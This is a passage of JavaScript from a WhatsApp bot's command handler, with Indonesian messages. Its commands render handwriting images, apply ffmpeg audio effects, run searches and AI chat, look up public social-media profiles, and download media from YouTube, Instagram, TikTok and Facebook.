				const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
				spawn('convert', [
					'./src/nulis/images/buku/sebelumkiri.jpg',
					'-font',
					'./src/nulis/font/Indie-Flower.ttf',
					'-size',
					'960x1280',
					'-pointsize',
					'23',
					'-interline-spacing',
					'2',
					'-annotate',
					'+140+153',
					fixHeight,
					'./src/nulis/images/buku/afterkiri.jpg'
				])
					.on('error', () => m.reply(mess.error))
					.on('exit', () => {
						m.reply({ image: fs.readFileSync('./src/nulis/images/buku/afterkiri.jpg'), caption: 'Jangan Malas Lord. Jadilah siswa yang rajin ರ_ರ' })
						setLimit(m, db)
					})
			}
				break
			case 'nuliskanan': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Kirim perintah *${prefix + command}* Teksnya`)
				m.reply(mess.wait)
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
				spawn('convert', [
					'./src/nulis/images/buku/sebelumkanan.jpg',
					'-font',
					'./src/nulis/font/Indie-Flower.ttf',
					'-size',
					'960x1280',
					'-pointsize',
					'23',
					'-interline-spacing',
					'2',
					'-annotate',
					'+128+129',
					fixHeight,
					'./src/nulis/images/buku/afterkanan.jpg'
				])
					.on('error', () => m.reply(mess.error))
					.on('exit', () => {
						m.reply({ image: fs.readFileSync('./src/nulis/images/buku/afterkanan.jpg'), caption: 'Jangan Malas Lord. Jadilah siswa yang rajin ರ_ರ' })
						setLimit(m, db)
					})
			}
				break
			case 'foliokiri': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Kirim perintah *${prefix + command}* Teksnya`)
				m.reply(mess.wait)
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
				spawn('convert', [
					'./src/nulis/images/folio/sebelumkiri.jpg',
					'-font',
					'./src/nulis/font/Indie-Flower.ttf',
					'-size',
					'1720x1280',
					'-pointsize',
					'23',
					'-interline-spacing',
					'4',
					'-annotate',
					'+48+185',
					fixHeight,
					'./src/nulis/images/folio/afterkiri.jpg'
				])
					.on('error', () => m.reply(mess.error))
					.on('exit', () => {
						m.reply({ image: fs.readFileSync('./src/nulis/images/folio/afterkiri.jpg'), caption: 'Jangan Malas Lord. Jadilah siswa yang rajin ರ_ರ' })
						setLimit(m, db)
					})
			}
				break
			case 'foliokanan': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Kirim perintah *${prefix + command}* Teksnya`)
				m.reply(mess.wait)
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
				spawn('convert', [
					'./src/nulis/images/folio/sebelumkanan.jpg',
					'-font',
					'./src/nulis/font/Indie-Flower.ttf',
					'-size',
					'1720x1280',
					'-pointsize',
					'23',
					'-interline-spacing',
					'4',
					'-annotate',
					'+89+190',
					fixHeight,
					'./src/nulis/images/folio/afterkanan.jpg'
				])
					.on('error', () => m.reply(mess.error))
					.on('exit', () => {
						m.reply({ image: fs.readFileSync('./src/nulis/images/folio/afterkanan.jpg'), caption: 'Jangan Malas Lord. Jadilah siswa yang rajin ರ_ರ' })
						setLimit(m, db)
					})
			}
				break
			case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai': {
				try {
					let set;
					if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
					if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
					if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
					if (/earrape/.test(command)) set = '-af volume=12'
					if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
					if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
					if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
					if (/reverse/.test(command)) set = '-filter_complex "areverse"'
					if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
					if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
					if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
					if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
					if (/audio/.test(mime)) {
						m.reply(mess.wait)
						let media = await Avishka.downloadAndSaveMediaMessage(qmsg)
						let ran = `./system/cashdata/${getRandom('.mp3')}`;
						exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
							fs.unlinkSync(media)
							if (err) return m.reply(err)
							let buff = fs.readFileSync(ran)
							m.reply({ audio: buff, mimetype: 'audio/mpeg' })
							fs.unlinkSync(ran)
						});
					} else m.reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
				} catch (e) {
					m.reply('Gagal!')
				}
			}
				break
			case 'tinyurl': case 'shorturl': case 'shortlink': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text || !isUrl(text)) return m.reply(`Example: ${prefix + command} https://github.com/avishka33`)
				try {
					let anu = await axios.get('https://tinyurl.com/api-create.php?url=' + text)
					m.reply('Url : ' + anu.data)
					setLimit(m, db)
				} catch (e) {
					m.reply('Gagal!')
				}
			}
				break
			case 'git': case 'gitclone': {
				if (!isLimit) return m.reply(mess.limit)
				if (!args[0]) return m.reply(`Example: ${prefix + command} https://github.com/avishka33`)
				if (!isUrl(args[0]) && !args[0].includes('github.com')) return m.reply('use Url Github!')
				let [, user, repo] = args[0].match(/(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i) || []
				try {
					m.reply({ document: { url: `https://api.github.com/repos/${user}/${repo}/zipball` }, fileName: repo + '.zip', mimetype: 'application/zip' }).catch((e) => m.reply(mess.error))
					setLimit(m, db)
				} catch (e) {
					m.reply('Gagal!')
				}
			}
				break

			// Ai Menu
			case 'ai': {
				if (!text) return m.reply(`Example: ${prefix + command} query`)
				try {
					let hasil = await yanzGpt([{ role: 'system', content: '' }, { role: 'user', content: text }])
					m.reply(hasil.choices[0].message.content)
				} catch (e) {
					try {
						let hasil = await youSearch(text)
						m.reply(hasil)
					} catch (e) {
						try {
							let hasil = await bk9Ai(text)
							m.reply(hasil.BK9)
						} catch (e) {
							m.reply(pickRandom(['Fitur Ai sedang bermasalah!', 'Tidak dapat terhubung ke ai!', 'Sistem Ai sedang sibuk sekarang!', 'Fitur sedang tidak dapat diuse!']))
						}
					}
				}
			}
				break
			case 'simi': {
				if (!text) return m.reply(`Example: ${prefix + command} query`)
				try {
					const hasil = await simi(text)
					m.reply(hasil.success)
				} catch (e) {
					m.reply('Server simi sedang offline!')
				}
			}
				break
			case 'bard': case 'gemini': case 'aiedit': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Example: ${prefix + command} Avidate berapa sekarang?`)
				if (!(APIKeys.geminiApikey?.length > 0 && APIKeys.geminiApikey?.some(a => a.trim() !== ''))) return m.reply('Silahkan Ambil Apikey Terlebih dahulu di\nhttps://aistudio.google.com/app/apikey')
				try {
					let apinya = pickRandom(APIKeys.geminiApikey)
					geminiAi(text, apinya, quoted.isMedia ? { mime: quoted.mime, media: await quoted.download() } : {}).then(a => {
						if (a.media) Avishka.sendMedia(m.chat, a.media, '', a.text || '', m)
						else if (a.text) m.reply(a.text)
					}).catch(e => {
						if (e.status === 503) m.reply('Model Gemini sedang sibuk, coba beberapa saat lagi...')
						else if (e.status === 400) m.reply('API key not valid. Please pass a valid API key.')
						else m.reply('Apikeymu limit atau terjadi error lain!')
					})
					setLimit(m, db)
				} catch (e) {
					m.reply('Apikeymu limit!\nSilahkan Ganti dengan apikey lain!')
				}
			}
				break

			// Search Menu
			case 'google': {
				if (!text) return m.reply(`Example: ${prefix + command} query`)
				try {
					let anu = await youSearch(text);
					m.reply(anu)
				} catch (e) {
					try {
						let anu = await yanzGpt([{ role: 'system', content: 'carikan informasi tentang hal tersebut secara mendetail, dengan sumbernya juga!' }, { role: 'user', content: text }]);
						m.reply(hasil.choices[0].message.content)
					} catch (e) {
						m.reply('Pencarian Tidak Ditemukan!')
					}
				}
			}
				break
			case 'gimage': case 'bingimg': {
				if (!text) return m.reply(`Example: ${prefix + command} query`)
				try {
					let anu = await fetchApi('/search/bing', { query: text });
					let una = pickRandom(anu.result)
					await m.reply({ image: { url: una }, caption: 'Hasil Pencarian ' + text })
					setLimit(m, db)
				} catch (e) {
					m.reply('Pencarian Tidak Ditemukan!')
				}
			}
				break
				
				
	case 'ytmp31': case 'ytaudio': case 'ytplayaudio': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Example: ${prefix + command} url_youtube`)
				if (!text.includes('youtu')) return m.reply('Url Tidak Mengandung Result Dari Youtube!')
				m.reply(mess.wait)
				try {
					const hasil = await ytMp3(text);
					await m.reply({
						audio: { url: hasil.result },
						mimetype: 'audio/mpeg',
						contextInfo: {
							externalAdReply: {
								title: hasil.title,
								body: hasil.channel,
								previewType: 'PHOTO',
								thumbnailUrl: hasil.thumb,
								mediaType: 1,
								renderLargerThumbnail: true,
								sourceUrl: text
							}
						}
					})
					setLimit(m, db)
				} catch (e) {
					try {
						let hasil = await savetube.download(text, 'mp3')
						await naze.sendFileUrl(m.chat, hasil.result.download, hasil.result.title, m)
						setLimit(m, db)
					} catch (e) {
						try {
							const nvl = new NvlGroup();
							let anu = await nvl.download(text);
							await naze.sendFileUrl(m.chat, anu.audio[0].url, anu.audio[0].size, m)
							setLimit(m, db)
						} catch (e) {
							try {
								let hasil = await fetchApi('/download/youtube', { url: text })
								await naze.sendFileUrl(m.chat, hasil.result.audio, hasil.result.title, m)
								setLimit(m, db)
							} catch (e) {
								m.reply('Gagal Mendownload Audio!')
							}
						}
					}
				}
			}
			break			
				
				
			 case 'yts1': case 'ytsearch1': case 'youtubesearch1': {
				if (!text) return m.reply(`Example: ${prefix + command} dj komang`)
				m.reply(mess.wait)
				try {
					const res = await yts.search(text);
					const hasil = pickRandom(res.all)
					const teksnya = `*📍Title:* ${hasil.title || 'Tidak tersedia'}\n*✏Description:* ${hasil.description || 'Tidak tersedia'}\n*🌟Channel:* ${hasil.author?.name || 'Tidak tersedia'}\n*⏳Duration:* ${hasil.seconds || 'Tidak tersedia'} second (${hasil.timestamp || 'Tidak tersedia'})\n*🔎Source:* ${hasil.url || 'Tidak tersedia'}\n\n_note : jika ingin mendownload silahkan_\n_pilih ${prefix}ytmp3 url_video atau ${prefix}ytmp4 url_video_`;
					await m.reply({ image: { url: hasil.thumbnail }, caption: teksnya })
				} catch (e) {
					try {
						const nvl = new NvlGroup();
						let anu = await nvl.search(text);
						let hasil = pickRandom(anu.videos)
						let teksnya = `*📍Title:* ${hasil.title || 'Tidak tersedia'}\n*✏Upload At:* ${hasil.uploaded || 'Tidak tersedia'}\n*🌟Channel:* ${hasil.author || 'Tidak tersedia'}\n*⏳Duration:* ${hasil.duration || 'Tidak tersedia'}\n*🔎Source:* ${hasil.url || 'Tidak tersedia'}\n\n_note : jika ingin mendownload silahkan_\n_pilih ${prefix}ytmp3 url_video atau ${prefix}ytmp4 url_video_`;
						await m.reply({ image: { url: hasil.thumbnail }, caption: teksnya })
					} catch (e) {
						try {
							const res = await fetchApi('/search/youtube', { query: text });
							const hasil = pickRandom(res.data)
							const teksnya = `*📍Title:* ${hasil.title || 'Tidak tersedia'}\n*✏Description:* ${hasil.description || 'Tidak tersedia'}\n*🌟Channel:* ${hasil.channelTitle || 'Tidak tersedia'}\n*⏳Duration:* ${hasil.duration || 'Tidak tersedia'}\n*🔎Source:* https://youtu.be/${hasil.id || 'Tidak tersedia'}\n\n_note : jika ingin mendownload silahkan_\n_pilih ${prefix}ytmp3 url_video atau ${prefix}ytmp4 url_video_`;
							await m.reply({ image: { url: hasil.thumbMedium }, caption: teksnya })
						} catch (e) {
							m.reply('Post not available!')
						}
					}
				}
			}
				break

			case 'pixiv': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Example: ${prefix + command} hu tao`)
				try {
					let { pixivdl } = require('./lib/pixiv')
					let res = await pixivdl(text)
					m.reply(mess.wait)
					for (let i = 0; i < res.media.length; i++) {
						let caption = i == 0 ? `${res.caption}\n\n*By:* ${res.artist}\n*Tags:* ${res.tags.join(', ')}` : ''
						let mime = (await FileType.fromBuffer(res.media[i])).mime
						await m.reply({ [mime.split('/')[0]]: res.media[i], caption, mimetype: mime })
					}
					setLimit(m, db)
				} catch (e) {
					m.reply('Post not available!')
				}
			}
				break
			case 'pinterest': case 'pint': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Example: ${prefix + command} hu tao`)
				try {
					let anu = await pinterest(text)
					let result = pickRandom(anu)
					if (anu.length < 1) {
						m.reply('Post not available!');
					} else {
						await m.reply({ image: { url: result.images_url }, caption: `*Media Url :* ${result.pin}${result.link ? '\n*Source :* ' + result.link : ''}` })
						setLimit(m, db)
					}
				} catch (e) {
					try {
						const res = await fetchApi('/search/pinterest', { query: text });
						const hasil = pickRandom(res.data.result.pins)
						await m.reply({ image: { url: hasil.media.images.orig.url }, caption: `*Media Url :* ${hasil.media.images.orig.url}${hasil.pin_url ? '\n*Source :* ' + hasil.pin_url : ''}` })
						setLimit(m, db)
					} catch (e) {
						m.reply('Pencarian tidak ditemukan!');
					}
				}
			}
				break
			case 'wallpaper': {
		//		if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Example: ${prefix + command} hu tao`)
				try {
					let anu = await wallpaper(text)
					let result = pickRandom(anu)
					if (anu.length < 1) {
						m.reply('Post not available!');
					} else {
						await m.reply({ image: { url: result.image[0] }, caption: `⭔ title : ${q}\n⭔ category : ${result.type}\n⭔ media url : ${result.image[2] || result.image[1] || result.image[0]}` })
						setLimit(m, db)
					}
				} catch (e) {
					try {
						let anu = await pinterest('wallpaper ' + text)
						let result = pickRandom(anu)
						if (anu.length < 1) {
							m.reply('Post not available!');
						} else {
							await m.reply({ image: { url: result.images_url }, caption: `*Media Url :* ${result.pin}${result.link ? '\n*Source :* ' + result.link : ''}` })
							setLimit(m, db)
						}
					} catch (e) {
						m.reply('Server wallpaper sedang offline!')
					}
				}
			}
				break
			case 'ringtone': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Example: ${prefix + command} black rover`)
				try {
					let anu = await ringtone(text)
					let result = pickRandom(anu)
					await m.reply({ audio: { url: result.audio }, fileName: result.title + '.mp3', mimetype: 'audio/mpeg' })
					setLimit(m, db)
				} catch (e) {
					m.reply('Audio tidak ditemukan!')
				}
			}
				break
			case 'npm': case 'npmjs': {
				if (!text) return m.reply(`Example: ${prefix + command} axios`)
				try {
					let res = await fetch(`http://registry.npmjs.com/-/v1/search?text=${text}`)
					let { objects } = await res.json()
					if (!objects.length) return m.reply('Pencarian Tidak di temukan')
					let txt = objects.map(({ package: pkg }) => {
						return `*${pkg.name}* (v${pkg.version})\n_${pkg.links.npm}_\n_${pkg.description}_`
					}).join`\n\n`
					m.reply(txt)
				} catch (e) {
					m.reply('Pencarian Tidak di temukan')
				}
			}
				break
			case 'style': {
				if (!text) return m.reply(`Example: ${prefix + command} Avishka`)
				let anu = await styletext(text)
				let txt = anu.map(a => `*${a.name}*\n${a.result}`).join`\n\n`
				m.reply(txt)
			}
				break
			case 'spotify': case 'spotifysearch': {
				if (!text) return m.reply(`Example: ${prefix + command} alan walker alone`)
				try {
					let hasil = await fetchJson('https://www.bhandarimilan.info.np/spotisearch?query=' + encodeURIComponent(text));
					let txt = hasil.map(a => {
						return `*Name : ${a.name}*\n- Artist : ${a.artist}\n- Url : ${a.link}`
					}).join`\n\n`
					m.reply(txt)
				} catch (e) {
					m.reply('Server Search Offline!')
				}
			}
				break
			case 'tenor': {
				if (!text) return m.reply(`Example: ${prefix + command} alone`)
				try {
					const anu = await fetchJson('https://g.tenor.com/v1/search?q=' + text + '&key=LIVDSRZULELA')
					const hasil = pickRandom(anu.results)
					await m.reply({ video: { url: hasil.media[0].mp4.url }, caption: `👀 *Media:* ${hasil.url}\n📋 *Description:* ${hasil.content_description}\n🔛 *Url:* ${hasil.itemurl}`, gifPlayback: true, gifAttribution: 2 })
				} catch (e) {
					m.reply('Hasil Tidak Ditemukan!')
				}
			}
				break
			case 'urban': {
				if (!text) return m.reply(`Example: ${prefix + command} alone`)
				try {
					const anu = await fetchJson('https://api.urbandictionary.com/v0/define?term=' + text)
					const hasil = pickRandom(anu.list)
					await m.reply(`${hasil.definition}\n\nSumber: ${hasil.permalink}`)
				} catch (e) {
					m.reply('Hasil Tidak Ditemukan!')
				}
			}
				break

			// Stalker Menu
			case 'igstalk': case 'instagramstalk': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Example: ${prefix + command} usernamenya`)
				try {
					let anu = await instaStalk(text)
					m.reply({ image: { url: anu.avatar }, caption: `*Username :* ${anu.username}\n*Nickname :* ${anu.nickname}\n*Bio :* ${anu.description}\n*Posts :* ${anu.posts}\n*Followers :* ${anu.followers}\n*Following :* ${anu.following}\n*List Post :* ${anu.list_post.map(a => `\n*Url :* ${a.imageUrl}\n*Description :* ${a.description}\n*Detail :* ${a.detailUrl}`).join('\n')}` })
				} catch (e) {
					try {
						let res = await fetchApi('/stalk/instagram', { username: text });
						m.reply({ image: { url: res.data.profile_picture_url }, caption: `*Username :*${res.data?.username || 'Tidak Ada'}\n*Nickname :*${res.data?.full_name || 'Tidak Ada'}\n*ID :*${res.data?.instagram_id}\n*Followers :*${res.data?.followers || '0'}\n*Following :*${res.data?.following || '0'}\n*Description :*${res.data?.description || 'Tidak Ada'}\n*Website :*${res.data?.website || 'Tidak Ada'}\n*Add At :*${res.data?.added_date}\n*Uploads :*${res.data?.uploads}\n*Verified :*${res.data?.is_verified}\n*Private :*${res.data.is_private}\n` })
					} catch (e) {
						m.reply('Username Tidak ditemukan!')
					}
				}
			}
				break
			case 'wastalk': case 'whatsappstalk': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Example: ${prefix + command} @tag / 628xxx`)
				try {
					let num = m.quoted?.sender || m.mentionedJid?.[0] || text
					if (!num) return m.reply(`Example : ${prefix + command} @tag / 628xxx`)
					num = num.replace(/\D/g, '') + '@s.whatsapp.net'
					if (!(await Avishka.onWhatsApp(num))[0]?.exists) return m.reply('Nomer tidak terdaftar di WhatsApp!')
					let img = await Avishka.profilePictureUrl(num, 'image').catch(_ => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60')
					let bio = await Avishka.fetchStatus(num).catch(_ => { })
					let name = await Avishka.getName(num)
					let business = await Avishka.getBusinessProfile(num)
					let format = PhoneNum(`+${num.split('@')[0]}`)
					let regionNames = new Intl.DisplayNames(['en'], { type: 'region' });
					let country = regionNames.of(format.getRegionCode('international'));
					let wea = `WhatsApp Stalk\n\n*° Country :* ${country.toUpperCase()}\n*° Name :* ${name ? name : '-'}\n*° Format Number :* ${format.getNumber('international')}\n*° Url Api :* wa.me/${num.split('@')[0]}\n*° Mentions :* @${num.split('@')[0]}\n*° Status :* ${bio?.status || '-'}\n*° Date Status :* ${bio?.setAt ? moment(bio.setAt.toDateString()).locale('id').format('LL') : '-'}\n\n${business ? `*WhatsApp Business Stalk*\n\n*° BusinessId :* ${business.wid}\n*° Website :* ${business.website ? business.website : '-'}\n*° Email :* ${business.email ? business.email : '-'}\n*° Category :* ${business.category}\n*° Address :* ${business.address ? business.address : '-'}\n*° Timeone :* ${business.business_hours.timezone ? business.business_hours.timezone : '-'}\n*° Description* : ${business.description ? business.description : '-'}` : '*Standard WhatsApp Account*'}`
					img ? await Avishka.sendMessage(m.chat, { image: { url: img }, caption: wea, mentions: [num] }, { quoted: m }) : m.reply(wea)
				} catch (e) {
					m.reply('Nomer Tidak ditemukan!')
				}
			}
				break

			case 'telestalk': case 'telegramstalk': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Example: ${prefix + command} usernamenya`)
				try {
					const res = await telegramStalk(text)
					if (!res.description || res.title.startsWith('Telegram: Contact')) throw 'Error'
					m.reply({ image: { url: res.image_url }, caption: `*Username :* ${text}\n*Nickname :* ${res.title || 'Tidak ada'}\n*Desc :* ${res.description || 'Tidak ada'}\n*Url :* ${res.url}` })
				} catch (e) {
					m.reply('Username Tidak ditemukan!')
				}
			}


				break
			case 'tiktokstalk': case 'ttstalk': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Example: ${prefix + command} usernamenya`)
				try {
					const res = await tiktokStalk(text)
					m.reply({ image: { url: res.avatarThumb }, caption: `*Username :* ${text}\n*Nickname :* ${res.nickname}\n*Followers :* ${res.followerCount}\n*Following :* ${res.followingCount}\n*Bio :* ${res.signature}\n*Verified :* ${res.verified}\n*Video Count :* ${res.videoCount}\n*Heart Count :* ${res.heartCount}` })
				} catch (e) {
					m.reply('Username Tidak ditemukan!')
				}
			}
				break
			case 'genshinstalk': case 'gistalk': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Example: ${prefix + command} idnya`)
				try {
					const res = await genshinStalk(text)
					m.reply({ image: { url: res.image }, caption: `*Genshin profile*\n- *ID :* ${res.uid}\n- *Nickname :* ${res.nickname}\n- *Signature :* ${res.signature}\n- *Level :* ${res.level}\n- *World Level :* ${res.world_level}\n- *Achivement :* ${res.achivement}\n- *Spiral Abyss :* ${res.spiral_abyss}\n- *Ttl :* ${res.ttl}` })
				} catch (e) {
					m.reply('Username Tidak ditemukan!')
				}
			}
				break
			case 'ghstalk': case 'githubstalk': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Example: ${prefix + command} usernamenya`)
				try {
					const res = await fetchJson('https://api.github.com/users/' + text)
					m.reply({ image: { url: res.avatar_url }, caption: `*Username :* ${res.login}\n*Nickname :* ${res.name || 'Tidak ada'}\n*Bio :* ${res.bio || 'Tidak ada'}\n*ID :* ${res.id}\n*Node ID :* ${res.node_id}\n*Type :* ${res.type}\n*Admin :* ${res.admin ? 'Ya' : 'Tidak'}\n*Company :* ${res.company || 'Tidak ada'}\n*Blog :* ${res.blog || 'Tidak ada'}\n*Location :* ${res.location || 'Tidak ada'}\n*Email :* ${res.email || 'Tidak ada'}\n*Public Repo :* ${res.public_repos}\n*Public Gists :* ${res.public_gists}\n*Followers :* ${res.followers}\n*Following :* ${res.following}\n*Created At :* ${res.created_at} *Updated At :* ${res.updated_at}` })
				} catch (e) {
					m.reply('Username Tidak ditemukan!')
				}
			}
				break

			// Downloader Menu
			case 'song1': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Example: ${prefix + command} url_youtube`)
				if (!text.includes('youtu')) return m.reply('Url Tidak Mengandung Result Dari Youtube!')
				m.reply(mess.wait)
				try {
					const hasil = await ytMp3(text);
					await m.reply({
						audio: { url: hasil.result },
						mimetype: 'audio/mpeg',
						contextInfo: {
							externalAdReply: {
								title: hasil.title,
								body: hasil.channel,
								previewType: 'PHOTO',
								thumbnailUrl: hasil.thumb,
								mediaType: 1,
								renderLargerThumbnail: true,
								sourceUrl: text
							}
						}
					})
					setLimit(m, db)
				} catch (e) {
					try {
						let hasil = await savetube.download(text, 'mp3')
						await Avishka.sendFileUrl(m.chat, hasil.result.download, hasil.result.title, m)
						setLimit(m, db)
					} catch (e) {
						try {
							const nvl = new NvlGroup();
							let anu = await nvl.download(text);
							await Avishka.sendFileUrl(m.chat, anu.audio[0].url, anu.audio[0].size, m)
							setLimit(m, db)
						} catch (e) {
							try {
								let hasil = await fetchApi('/download/youtube', { url: text })
								await Avishka.sendFileUrl(m.chat, hasil.result.audio, hasil.result.title, m)
								setLimit(m, db)
							} catch (e) {
								m.reply('error download Audio!')
							}
						}
					}
				}
			}
				break
			case 'video1':  {
				if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Example: ${prefix + command} url_youtube`)
				if (!text.includes('youtu')) return m.reply('Url Tidak Mengandung Result Dari Youtube!')
				m.reply(mess.wait)
				try {
					const hasil = await ytMp4(text);
					await m.reply({ video: hasil.result, caption: `*📍Title:* ${hasil.title}\n*✏Description:* ${hasil.desc ? hasil.desc : ''}\n*🚀Channel:* ${hasil.channel}\n*🗓Upload at:* ${hasil.uploadDate}` })
					setLimit(m, db)
				} catch (e) {
					try {
						let hasil = await savetube.download(text, '360')
						await Avishka.sendFileUrl(m.chat, hasil.result.download, hasil.result.title, m)
						setLimit(m, db)
					} catch (e) {
						try {
							const nvl = new NvlGroup();
							let anu = await nvl.download(text);
							await Avishka.sendFileUrl(m.chat, anu.video.find(v => v.height === 360).url || anu.video[0].url, 'Done', m)
							setLimit(m, db)
						} catch (e) {
							try {
								let hasil = await fetchApi('/download/youtube', { url: text })
								await Avishka.sendFileUrl(m.chat, hasil.result.video, hasil.result.title, m)
								setLimit(m, db)
							} catch (e) {
								m.reply('error download Audio!')
							}
						}
					}
				}
			}
				break
			case 'ig': case 'instagram': case 'instadl': case 'igdown': case 'igdl': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Example: ${prefix + command} url_instagram`)
				if (!text.includes('instagram.com')) return m.reply('Url Tidak Mengandung Result Dari Instagram!')
				m.reply(mess.wait)
				try {
					const hasil = await instagramDl(text);
					if (hasil.length < 0) return m.reply('Postingan Tidak Tersedia atau Privat!')
					for (let i = 0; i < hasil.length; i++) {
						await Avishka.sendFileUrl(m.chat, hasil[i].url, 'Done', m)
					}
					setLimit(m, db)
				} catch (e) {
					try {
						let hasil = await fetchApi('/download/instagram', { url: text })
						if (hasil.result.url.length < 0) return m.reply('Postingan Tidak Tersedia atau Privat!')
						for (let i = 0; i < hasil.result.url.length; i++) {
							await Avishka.sendFileUrl(m.chat, hasil.result.url[i], 'Done', m)
						}
						setLimit(m, db)
					} catch (e) {
						m.reply('Postingan Tidak Tersedia atau Privat!')
					}
				}
			}
				break
			case 'igstory': case 'instagramstory': case 'instastory': case 'storyig': {
				if (!text) return m.reply(`Example: ${prefix + command} usernamenya`)
				try {
					const hasil = await instaStory(text);
					m.reply(mess.wait)
					for (let i = 0; i < hasil.results.length; i++) {
						await Avishka.sendFileUrl(m.chat, hasil.results[i].url, 'Done', m)
					}
				} catch (e) {
					m.reply('Username tidak ditemukan atau Privat!');
				}
			}
				break
			case 'tiktok': case 'tiktokdown': case 'ttdown': case 'ttdl': case 'tt': case 'ttmp4': case 'ttvideo': case 'tiktokmp4': case 'tiktokvideo': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Example: ${prefix + command} url_tiktok`)
				if (!text.includes('tiktok.com')) return m.reply('Url Tidak Mengandung Result Dari Tiktok!')
				try {
					const hasil = await tiktokDl(text);
					m.reply(mess.wait)
					if (hasil && hasil.size_nowm) {
						await Avishka.sendFileUrl(m.chat, hasil.data[1].url, `*📍Title:* ${hasil.title}\n*⏳Duration:* ${hasil.duration}\n*🎃Author:* ${hasil.author.nickname} (@${hasil.author.fullname})`, m)
					} else {
						for (let i = 0; i < hasil.data.length; i++) {
							await Avishka.sendFileUrl(m.chat, hasil.data[i].url, `*🚀Image:* ${i + 1}`, m)
						}
					}
					setLimit(m, db)
				} catch (e) {
					m.reply('Gagal/Url tidak valid!')
				}
			}
				break
			case 'ttmp3': case 'tiktokmp3': case 'ttaudio': case 'tiktokaudio': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Example: ${prefix + command} url_tiktok`)
				if (!text.includes('tiktok.com')) return m.reply('Url Tidak Mengandung Result Dari Tiktok!')
				try {
					const hasil = await tiktokDl(text);
					m.reply(mess.wait)
					await m.reply({
						audio: { url: hasil.music_info.url },
						mimetype: 'audio/mpeg',
						contextInfo: {
							externalAdReply: {
								title: 'TikTok • ' + hasil.author.nickname,
								body: hasil.stats.likes + ' suka, ' + hasil.stats.comment + ' komentar. ' + hasil.title,
								previewType: 'PHOTO',
								thumbnailUrl: hasil.cover,
								mediaType: 1,
								renderLargerThumbnail: true,
								sourceUrl: text
							}
						}
					})
					setLimit(m, db)
				} catch (e) {
					m.reply('Gagal/Url tidak valid!')
				}
			}
				break
			case 'fb': case 'fbdl': case 'fbdown': case 'facebook': case 'facebookdl': case 'facebookdown': case 'fbdownload': case 'fbmp4': case 'fbvideo': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Example: ${prefix + command} url_facebook`)
				if (!text.includes('facebook.com')) return m.reply('Url Tidak Mengandung Result Dari Facebook!')
				try {
					const hasil = await facebookDl(text);
					if (hasil.results.length < 1) {
						m.reply('Video Tidak ditemukan!')
					} else {
						m.reply(mess.wait)
						await Avishka.sendFileUrl(m.chat, hasil.results[0].url, `*🎐Title:* ${hasil.caption}`, m);
					}
					setLimit(m, db)
				} catch (e) {
					m.reply('Server downloader facebook sedang offline!')
				}
			}
				break
			case 'mediafire': case 'mf': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Example: ${prefix + command} https://www.mediafire.com/file/xxxxxxxxx/xxxxx.zip/file`)
				if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return m.reply('Url Invalid!')
				try {
					const anu = await mediafireDl(text)
					await m.reply({ document: { url: anu.link }, caption: `*MEDIAFIRE DOWNLOADER*\n\n*${setv} Name* : ${anu.name}\n*${setv} Size* : ${anu.size}\n*${setv} Type* : ${anu.type}\n*${setv} Upload At* : ${anu.upload_date}\n*${setv} Link* : ${anu.link}`, fileName: anu.name, mimetype: anu.type })
